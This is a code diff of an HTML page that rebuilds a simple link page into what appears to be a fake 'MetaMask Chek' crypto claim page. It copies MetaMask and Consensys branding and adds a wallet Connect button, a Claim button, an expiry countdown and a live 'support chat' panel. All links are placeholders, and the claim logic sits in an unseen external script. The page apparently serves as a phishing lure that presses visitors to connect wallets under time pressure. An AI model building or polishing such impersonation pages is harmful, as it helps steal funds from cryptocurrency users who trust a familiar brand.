@@ -1,87 +1,166 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Greenland</title> <link rel="stylesheet" href="/styles.css" />
-
+  <title>Check</title>
+  <link rel="stylesheet" href="/styles.css" />
 </head>
 <body>
-  <h1 id="amount">Loading…</h1>
-  <p id="meta"></p>
+  <!-- TOP (beige) -->
+  <div class="top">
+    <header class="nav">
+      <div class="nav-left">
+        <img class="logo" src="/assets/logo.svg" alt="logo" />
+        <nav class="menu">
+          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Features</a>
+          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">About</a>
+          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Download</a>
+          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Support</a>
+        </nav>
+      </div>
 
-  <hr />
+      <!-- Connect (dummy for now) -->
+      <button class="btn-connect" id="btnConnect" type="button">Connect</button>
+    </header>
 
-  <h3>Support chat</h3>
-  <div id="chat" style="border:1px solid #ddd; padding:10px; height:220px; overflow:auto; white-space:pre-wrap;"></div>
+    <main class="hero">
+      <div class="hero-left">
+        <div class="img-box">
+          <img class="img" src="/assets/hero.png" alt="hero" />
+        </div>
+      </div>
 
-  <div style="margin-top:10px;">
-    <input id="msg" placeholder="Write to support…" style="width:70%; padding:8px;" />
-    <button id="send" style="padding:8px 12px;">Send</button>
+      <div class="hero-center">
+        <div class="check-title" id="checkTitle">MetaMask Chek #------</div>
+
+        <div class="amount" id="amount">$0</div>
+
+        <div class="currency" id="currency">currency: USDT</div>
+
+        <button class="btn-claim" id="btnClaim" type="button">Claim</button>
+
+        <div class="warning">
+          Warning: sharing your check link may result in loosing funds.
+        </div>
+      </div>
+
+      <div class="hero-right">
+        <div class="expires">
+          <div class="expires-label">EXPIRES IN</div>
+          <div class="expires-time" id="expires">11:59</div>
+        </div>
+      </div>
+    </main>
+
+    <!-- Floating chat button -->
+    <button class="chat-fab" id="chatFab" type="button">
+      <span class="chat-fab-icon" aria-hidden="true">
+        <img src="/assets/support.svg" alt="" />
+      </span>
+      <span class="chat-fab-text">Chat</span>
+    </button>
+
+    <!-- Chat panel -->
+    <section class="chat-panel" id="chatPanel" aria-hidden="true">
+      <div class="chat-panel-head">
+        <div class="chat-panel-title">Support chat</div>
+        <button class="chat-close" id="chatClose" type="button">✕</button>
+      </div>
+
+      <div class="chat-messages" id="chatMessages"></div>
+
+      <div class="chat-input">
+        <input id="chatMsg" placeholder="Write to support…" />
+        <button id="chatSend" type="button">Send</button>
+      </div>
+    </section>
   </div>
 
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get("id");
+  <!-- GREEN SECTION -->
+  <section class="how">
+    <div class="how-bar">
+      <div class="how-title">How it works?</div>
+    </div>
 
-    const amountEl = document.getElementById("amount");
-    const metaEl = document.getElementById("meta");
-    const chatEl = document.getElementById("chat");
-    const msgInput = document.getElementById("msg");
-    const sendBtn = document.getElementById("send");
+    <div class="how-inner">
+      <div class="how-left">
+        <div class="img-box big">
+          <img class="img" src="/assets/instruction.png" alt="instruction" />
+        </div>
+      </div>
 
-    // Load link data
-    fetch(`/api/link?id=${id}`)
-      .then(r => r.json())
-      .then(data => {
-        if (!data.ok) {
-          document.body.innerHTML = "Link not found";
-          return;
-        }
-        amountEl.textContent = data.amount + " " + data.currency.toUpperCase();
-        metaEl.textContent = "Link ID: " + data.id;
-      });
+      <div class="how-right">
+        <div class="how-text">
+          <div class="how-h">Someone created this Check</div>
+          <div>The sender locked funds in a smart contract and generated a unique claim link.</div>
+          <div>Anyone with this link can claim the funds once.</div>
 
-    // Thread id per visitor per link
-    let threadId = localStorage.getItem("greenland_thread_" + id);
-    if (!threadId) {
-      threadId = Math.random().toString(36).slice(2, 10);
-      localStorage.setItem("greenland_thread_" + id, threadId);
-    }
+          <div class="how-h">Connect any wallet</div>
+          <div>To claim, connect a compatible wallet of your choice.</div>
+          <div>You don’t need to use MetaMask to receive the funds.</div>
 
-    function render(messages) {
-      chatEl.textContent = (messages || []).map(m => {
-        const who = m.from === "visitor" ? "You" : "Support";
-        const time = new Date(m.ts).toLocaleTimeString();
-        return "[" + time + "] " + who + ": " + m.text;
-      }).join("\n");
-      chatEl.scrollTop = chatEl.scrollHeight;
-    }
+          <div class="how-h">Claim on-chain</div>
+          <div>When you tap Claim, a transaction is submitted on the network.</div>
+          <div>The funds are sent directly to your wallet address.</div>
 
-    function poll() {
-      fetch(`/api/support/poll?linkId=${encodeURIComponent(id)}&threadId=${encodeURIComponent(threadId)}`)
-        .then(r => r.json())
-        .then(d => { if (d.ok) render(d.messages); })
-        .catch(() => {})
-        .finally(() => setTimeout(poll, 1500));
-    }
+          <div class="how-h">One-time use</div>
+          <div>Each Chek can only be claimed once.</div>
+          <div>After it’s claimed or expires, the link becomes inactive.</div>
+        </div>
+      </div>
 
-    function send() {
-      const text = msgInput.value.trim();
-      if (!text) return;
-      msgInput.value = "";
+      <div class="coin">
+        <img class="img" src="/assets/coin.png" alt="coin" />
+      </div>
 
-      fetch("/api/support/send", {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({ linkId: id, threadId, text })
-      }).catch(() => {});
-    }
+      <div class="know">
+        <div class="know-h">What you should know</div>
+        <div>MetaMask does not hold your funds</div>
+        <div>MetaMask cannot reverse or cancel a claimed Chek</div>
+        <div>MetaMask will never ask for your secret recovery phrase</div>
+        <div>If this Chek expires or is already claimed, the funds remain with the original sender.</div>
+      </div>
+    </div>
+  </section>
 
-    sendBtn.onclick = send;
-    msgInput.addEventListener("keydown", (e) => { if (e.key === "Enter") send(); });
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="footer-left">
+      <div class="img-box foot">
+        <img class="img" src="/assets/hero.png" alt="hero" />
+      </div>
+    </div>
 
-    poll();
-  </script>
+    <div class="footer-center">
+      <div class="socials">
+        <!-- pretend these exist (as you said). upload later into public/assets/social/ -->
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/x.png" alt="x" /></a>
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/github.png" alt="github" /></a>
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/youtube.png" alt="youtube" /></a>
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/instagram.png" alt="instagram" /></a>
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/reddit.png" alt="reddit" /></a>
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/discord.png" alt="discord" /></a>
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/tiktok.png" alt="tiktok" /></a>
+        <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/rss.png" alt="rss" /></a>
+      </div>
+
+      <div class="fine">
+        <span>Consensys</span>
+        <span>Privacy Policy</span>
+        <span>Terms of Use</span>
+        <span>Contributor License Agreement</span>
+        <span>Sitemap</span>
+        <span>Accessibility</span>
+        <span>Manage Cookies</span>
+      </div>
+
+      <div class="copy">
+        ©2026 MetaMask • A Consensys Formation
+      </div>
+    </div>
+  </footer>
+
+  <script src="/app.js"></script>
 </body>
 </html>
